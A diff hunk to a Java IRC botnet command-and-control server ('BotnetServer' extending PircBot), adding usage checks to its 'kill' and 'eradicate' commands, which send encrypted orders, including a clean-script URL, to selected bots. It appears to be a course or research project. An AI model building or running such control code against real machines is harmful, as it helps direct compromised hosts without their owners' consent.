@@ -294,18 +294,26 @@ public class BotnetServer extends PircBot {
 		//Respond to a kill command by sending it to the bots
 		} else if (s.toLowerCase().startsWith("kill")) {
 			String[] parts = s.split(" ");
-			String[] bots = chooseBots(parts, 1);
-			for (String name : bots) {
-				//sendMessage(name, parts[0]);
-				sendMessage(name, botKeys.get(name).encryptMsg(parts[0]));
+			if (parts.length < 2) {
+				System.out.println("\tUsage: kill bot [more bots]");
+			} else {
+				String[] bots = chooseBots(parts, 1);
+				for (String name : bots) {
+					//sendMessage(name, parts[0]);
+					sendMessage(name, botKeys.get(name).encryptMsg(parts[0]));
+				}
 			}
 		//Respond to an eradicate command by sending it along with the clean script url to each bot
 		} else if (s.toLowerCase().startsWith("eradicate")) {
 			String[] parts = s.split(" ");
-			String[] bots = chooseBots(parts, 2);
-			for (String name : bots) {
-				String command = parts[0] + " " + parts[1];
-				sendMessage(name, botKeys.get(name).encryptMsg(command));
+			if (parts.length < 3) {
+				System.out.println("\tUsage: eradicate cleanScript bot [more bots]");
+			} else {
+				String[] bots = chooseBots(parts, 2);
+				for (String name : bots) {
+					String command = parts[0] + " " + parts[1];
+					sendMessage(name, botKeys.get(name).encryptMsg(command));
+				}
 			}
 		//Respond to a message beginning with a colon by messaging the CHANNEL
 		} else if (s.startsWith(":")) {
